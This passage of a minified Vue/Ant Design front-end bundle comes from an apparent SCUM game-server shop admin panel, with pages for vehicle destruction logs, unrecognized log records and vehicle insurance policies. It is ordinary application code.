0!==a&&e.expandedVehicleDestructionRecordIds.splice(a,1)}}},scopedSlots:e._u([{key:"actionType",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==e.actionTypeList.find((function(e){return e.value===a.actionType}))?e.actionTypeList.find((function(e){return e.value===a.actionType})).color:"grey"}},[e._v(" "+e._s(void 0!==e.actionTypeList.find((function(e){return e.value===a.actionType}))?e.actionTypeList.find((function(e){return e.value===a.actionType})).label:a.actionType)+" ")])]}},{key:"locationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.locations)+"("+e._s(a.area)+")")])]}},{key:"ownerScumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.vehicleDestructionRecordOwnerUser&&a.vehicleDestructionRecordOwnerUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.vehicleDestructionRecordOwnerUser.userName}})}}},[e._v("("+e._s(a.vehicleDestructionRecordOwnerUser.userName)+")")]):e._e()]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedVehicleDestructionRecordIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e()]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("载具类型/ID")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[e._v(" "+e._s(t.vehicleType)+" ("),i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(t.vehicleId))]),e._v(") ")]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("事件发生坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.locations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.area)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.locations}})],1)]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.vehicleDestructionRecordListPagination.pageSize,current:e.vehicleDestructionRecordListPagination.pageNum,total:e.vehicleDestructionRecordListPagination.total},on:{change:e.onChangeVehicleDestructionRecordListPagination,showSizeChange:e.onShowSizeChangeVehicleDestructionRecordListPagination}})],1)])],1)}),[],!1,null,"77600ed7",null),na=aa.exports,ra={name:"UnrecognizedRecord",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,loadingUnrecognizedRecordListTable:!1,unrecognizedRecordListFilter:{fileName:void 0,rawText:void 0,timeStampStart:void 0,timeStampEnd:void 0},unrecognizedRecordListColumns:[{title:"所属日志文件名",key:"fileName",dataIndex:"fileName",width:180,align:"center",scopedSlots:{customRender:"fileName"}},{title:"日志原文",key:"rawText",dataIndex:"rawText",width:250,align:"center",scopedSlots:{customRender:"rawText"}},{title:"发生时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],unrecognizedRecordListData:[],unrecognizedRecordListPagination:{pageSize:20,pageNum:1,total:0},expandedUnrecognizedRecordIds:[],selectedRowKeys:[]}},mounted:function(){this.getUnrecognizedRecordList()},methods:{onUnrecognizedRecordListCleanFilter:function(){var e=this;this.unrecognizedRecordListPagination.pageNum=1,this.$nextTick((function(){e.getUnrecognizedRecordList(!0)}))},onUnrecognizedRecordListFilter:function(){var e=this;this.unrecognizedRecordListPagination.pageNum=1,this.$nextTick((function(){e.getUnrecognizedRecordList()}))},onChangeUnrecognizedRecordListPagination:function(e){var t=this;this.unrecognizedRecordListPagination.pageNum=e,this.$nextTick((function(){t.getUnrecognizedRecordList()}))},onShowSizeChangeUnrecognizedRecordListPagination:function(e,t){var i=this;this.unrecognizedRecordListPagination.pageNum=1,this.unrecognizedRecordListPagination.pageSize=t,this.$nextTick((function(){i.getUnrecognizedRecordList()}))},getUnrecognizedRecordList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.unrecognizedRecordListPagination,n=a.pageNum,r=a.pageSize,e?(t.unrecognizedRecordListFilter={fileName:void 0,rawText:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.unrecognizedRecordListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingUnrecognizedRecordListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/unrecognizedRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingUnrecognizedRecordListTable=!1,200===c.status&&(t.unrecognizedRecordListPagination.total=c.data.count,t.unrecognizedRecordListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingUnrecognizedRecordListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.unrecognizedRecordListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},cleanUnrecognizedRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/unrecognizedRecordAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getUnrecognizedRecordList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},oa=Object(S.a)(ra,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"其他未识别日志记录"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空未识别日志吗"},on:{confirm:e.cleanUnrecognizedRecord}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空未识别日志")])],1)]:e._e()],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onUnrecognizedRecordListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onUnrecognizedRecordListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("所属日志文件名:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.unrecognizedRecordListFilter.fileName,callback:function(t){e.$set(e.unrecognizedRecordListFilter,"fileName",t)},expression:"unrecognizedRecordListFilter.fileName"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("日志内容:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.unrecognizedRecordListFilter.rawText,callback:function(t){e.$set(e.unrecognizedRecordListFilter,"rawText",t)},expression:"unrecognizedRecordListFilter.rawText"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.unrecognizedRecordListFilter.timestampStart,e.unrecognizedRecordListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.unrecognizedRecordListFilter,"timestampStart",t[0]),e.$set(e.unrecognizedRecordListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.unrecognizedRecordListColumns,"data-source":e.unrecognizedRecordListData,expandedRowKeys:e.expandedUnrecognizedRecordIds,"row-key":"id",pagination:!1,loading:e.loadingUnrecognizedRecordListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedUnrecognizedRecordIds.find((function(e){return e===i.id}))&&e.expandedUnrecognizedRecordIds.push(i.id);else{var a=Object.keys(e.expandedUnrecognizedRecordIds).find((function(t){return e.expandedUnrecognizedRecordIds[t]===i.id}));void 0!==a&&e.expandedUnrecognizedRecordIds.splice(a,1)}}},scopedSlots:e._u([{key:"rawText",fn:function(t,a){return[i("div",{staticStyle:{"text-overflow":"ellipsis","overflow-x":"hidden","white-space":"nowrap"},style:{cursor:void 0===e.expandedUnrecognizedRecordIds.find((function(e){return e===a.id}))?"pointer":"auto"},attrs:{title:void 0===e.expandedUnrecognizedRecordIds.find((function(e){return e===a.id}))?t+"\n【点击展开】":t},on:{click:function(t){void 0===e.expandedUnrecognizedRecordIds.find((function(e){return e===a.id}))&&e.expandedUnrecognizedRecordIds.push(a.id)}}},[e._v(" "+e._s(t)+" ")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedUnrecognizedRecordIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.unrecognizedRecordListPagination.pageSize,current:e.unrecognizedRecordListPagination.pageNum,total:e.unrecognizedRecordListPagination.total},on:{change:e.onChangeUnrecognizedRecordListPagination,showSizeChange:e.onShowSizeChangeUnrecognizedRecordListPagination}})],1)])],1)}),[],!1,null,"7e43444d",null).exports,sa={name:"VehicleEnsurance",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,deleteLoading:!1,vehicleEnsuranceStatusKeyValue:{active:"生效",paid:"已出险赔付",refunded:"已退保"},vehicleEnsuranceStatusBadgeKeyValue:{active:"processing",paid:"success",refunded:"error"},loadingVehicleEnsuranceListTable:!1,vehicleEnsuranceListFilter:{vehicleId:void 0,userSteamId:void 0,userName:void 0,buyId:void 0,status:void 0,timestampStart:void 0,timestampEnd:void 0},vehicleEnsuranceListColumns:[{title:"保单ID",key:"id",dataIndex:"id",width:150,align:"center",scopedSlots:{customRender:"id"}},{title:"投保者昵称",key:"userName",dataIndex:"userName",width:150,align:"center",scopedSlots:{customRender:"userName"}},{title:"投保者Steam ID",key:"userSteamId",dataIndex:"userSteamId",width:150,align:"center",scopedSlots:{customRender:"userSteamId"}},{title:"载具ID",key:"vehicleId",dataIndex:"vehicleId",width:120,align:"center",scopedSlots:{customRender:"vehicleId"}},{title:"订单ID",key:"buyId",dataIndex:"buyId",width:180,align:"center",scopedSlots:{customRender:"buyId"}},{title:"保单状态",key:"status",dataIndex:"status",width:100,align:"center",scopedSlots:{customRender:"status"}},{title:"投保时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:180,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],vehicleEnsuranceListData:[],vehicleEnsuranceListPagination:{pageSize:20,pageNum:1,total:0},expandedVehicleEnsuranceIds:[]}},mounted:function(){var e=this;this.$route.query.id&&(this.vehicleEnsuranceListFilter.id=this.$route.query.id),this.$nextTick((function(){e.getVehicleEnsuranceList(void 0,e.$route.query.id)}))},methods:{onVehicleEnsuranceListCleanFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/vehicleEnsurance"}),this.vehicleEnsuranceListPagination.pageNum=1,this.$nextTick((function(){e.getVehicleEnsuranceList(!0)}))},onVehicleEnsuranceListFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/vehicleEnsurance"}),this.vehicleEnsuranceListPagination.pageNum=1,this.$nextTick((function(){e.getVehicleEnsuranceList()}))},onChangeVehicleEnsuranceListPagination:function(e){var t=this;this.vehicleEnsuranceListPagination.pageNum=e,this.$nextTick((function(){t.getVehicleEnsuranceList()}))},onShowSizeChangeVehicleEnsuranceListPagination:function(e,t){var i=this;this.vehicleEnsuranceListPagination.pageNum=1,this.vehicleEnsuranceListPagination.pageSize=t,this.$nextTick((function(){i.getVehicleEnsuranceList()}))},getVehicleEnsuranceList:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n,r,o,l,c,d;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return n=i.vehicleEnsuranceListPagination,r=n.pageNum,o=n.pageSize,e?(i.vehicleEnsuranceListFilter={vehicleId:void 0,userSteamId:void 0,userName:void 0,buyId:void 0,status:void 0,timestampStart:void 0,timestampEnd:void 0},l={pageNum:r,pageSize:o}):(void 0!==(c=Object(A.cloneDeep)(i.vehicleEnsuranceListFilter)).timestampStart&&void 0!==c.timestampEnd&&(c.timestampStart=R()(c.timestampStart).valueOf(),c.timestampEnd=R()(c.timestampEnd).valueOf()),l=Object(s.a)({pageNum:r,pageSize:o},c)),i.loadingVehicleEnsuranceListTable=!0,a.prev=3,a.next=6,f({method:"GET",url:"/vehicleEnsuranceAdminSys/list",params:l});case 6:d=a.sent,i.loadingVehicleEnsuranceListTable=!1,200===d.status&&(i.vehicleEnsuranceListPagination.total=d.data.count,i.vehicleEnsuranceListData=d.data.list.map((function(e){try{e.configs=JSON.parse(e.configs)}catch(e){}return e})),i.$nextTick((function(){if(void 0!==t){var e=d.data.list.find((function(e){return e.id===t}));i.$set(i,"expandedVehicleEnsuranceIds",[e.id])}else i.$set(i,"expandedVehicleEnsuranceIds",[])}))),a.next=15;break;case 11:a.prev=11,a.t0=a.catch(3),console.error(a.t0),i.loadingVehicleEnsuranceListTable=!1;case 15:case"end":return a.stop()}}),a,null,[[3,11]])})))()},forceCommitVehicleEnsuranceItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"POST",url:"/vehicleEnsuranceAdminSys/forceCommit",data:a});case 4:200===i.sent.status&&(t.$message.success("手动操作理赔成功"),t.getVehicleEnsuranceList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},forceRefundVehicleEnsuranceItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/vehicleEnsuranceAdminSys/forceRefund",params:a});case 4:200===i.sent.status&&(t.$message.success("已操作退保"),t.getVehicleEnsuranceList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},deleteVehicleEnsuranceItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,t.deleteLoading=!0,i.next=4,f({method:"DELETE",url:"/vehicleEnsuranceAdminSys/delete",params:{id:e}});case 4:200===i.sent.status&&(t.deleteLoading=!1,t.$message.success("操作成功"),t.getVehicleEnsuranceList()),i.next=12;break;case 8:i.prev=8,i.t0=i.catch(0),t.deleteLoading=!1,console.error(i.t0);case 12:case"end":return i.stop()}}),i,null,[[0,8]])})))()},cleanVehicleEnsuranceRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/vehicleEnsuranceAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getVehicleEnsuranceList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},la=Object(S.a)(sa,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"载具保险投保列表"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空载具保险投保列表吗"},on:{confirm:e.cleanVehicleEnsuranceRecord}},[i("a-button",{attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空载具保险投保列表")])],1)],1):e._e()]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onVehicleEnsuranceListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onVehicleEnsuranceListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block"}},[e._v("载具ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.vehicleEnsuranceListFilter.vehicleId,callback:function(t){e.$set(e.vehicleEnsuranceListFilter,"vehicleId",t)},expression:"vehicleEnsuranceListFilter.vehicleId"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("购买者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.vehicleEnsuranceListFilter.userSteamId,callback:function(t){e.$set(e.vehicleEnsuranceListFilter,"userSteamId",t)},expression:"vehicleEnsuranceListFilter.userSteamId"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("购买者商城用户名:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.vehicleEnsuranceListFilter.userName,callback:function(t){e.$set(e.vehicleEnsuranceListFilter,"userName",t)},expression:"vehicleEnsuranceListFilter.userName"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block"}},[e._v("源订单ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.vehicleEnsuranceListFilter.buyId,callback:function(t){e.$set(e.vehicleEnsuranceListFilter,"buyId",t)},expression:"vehicleEnsuranceListFilter.buyId"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("保险状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.vehicleEnsuranceListFilter.status,callback:function(t){e.$set(e.vehicleEnsuranceListFilter,"status",t)},expression:"vehicleEnsuranceListFilter.status"}},e._l(e.vehicleEnsuranceStatusKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("购买时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.vehicleEnsuranceListFilter.timestampStart,e.vehicleEnsuranceListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.vehicleEnsuranceListFilter,"timestampStart",t[0]),e.$set(e.vehicleEnsuranceListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-alert",{staticStyle:{"margin-bottom":"10px"},attrs:{"show-icon":"",message:"要使载具保险正常运作，需前往【商城配置管理】-【商城和美金设置】-【可选功能开关】打开【每5分钟获取服务器载具列表】开关并使用最新版本的商城机器人。载具保险不支持套餐/滴滴车/奖品，只支持普通商品，反悔期和保险时效的起算时间是从获取到载具ID开始，计算的时候请参考【消息队列管理】里面对应的发货记录的状态更新时间",type:"info"}}),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.vehicleEnsuranceListColumns,"data-source":e.vehicleEnsuranceListData,expandedRowKeys:e.expandedVehicleEnsuranceIds,"row-key":"id",pagination:!1,loading:e.loadingVehicleEnsuranceListTable,bordered:"",scroll:{x:"100%"},size:"small"},on:{expand:function(t,i){if(t)void 0===e.expandedVehicleEnsuranceIds.find((function(e){return e===i.id}))&&e.expandedVehicleEnsuranceIds.push(i.id);else{var a=Object.keys(e.expandedVehicleEnsuranceIds).find((function(t){return e.expandedVehicleEnsuranceIds[t]===i.id}));void 0!==a&&e.expandedVehicleEnsuranceIds.splice(a,1)}}},scopedSlots:e._u([{key:"id",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"userName",fn:function(t,a){return[a.user?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.user.userName}})}}},[e._v(e._s(a.user?a.user.userName:a.userId))])]:i("span",[e._v(" - ")])]}},{key:"userSteamId",fn:function(t,a){return[a.user?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{steamId:a.user.steamId}})}}},[e._v(e._s(a.user?a.user.steamId:"-"))])]:i("span",[e._v(" - ")])]}},{key:"vehicleId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"buyId",fn:function(t,a){return[a.buy?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/buy",query:{id:a.buy.id}})}}},[e._v(e._s(a.buy?a.buy.id:a.buyId))])]:i("span",[e._v(" - ")])]}},{key:"status",fn:function(t){return[i("span",[e.vehicleEnsuranceStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.vehicleEnsuranceStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(e.vehicleEnsuranceStatusKeyValue[t]))])],1)]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedVehicleEnsuranceIds.find((function(e){return e===t.id}))?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("操作")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px","margin-bottom":"5px"}},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role||"active"!==t.status?e._e():i("a-button",{attrs:{size:"small",icon:"check-circle",type:"primary"},on:{click:function(){return e.forceCommitVehicleEnsuranceItem(t.id)}}},[e._v("手动操作理赔")]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role||"active"!==t.status?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"rollback",type:"primary"},on:{click:function(){return e.forceRefundVehicleEnsuranceItem(t.id)}}},[e._v("手动操作退保")]),e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除投保记录吗"},on:{confirm:function(){return 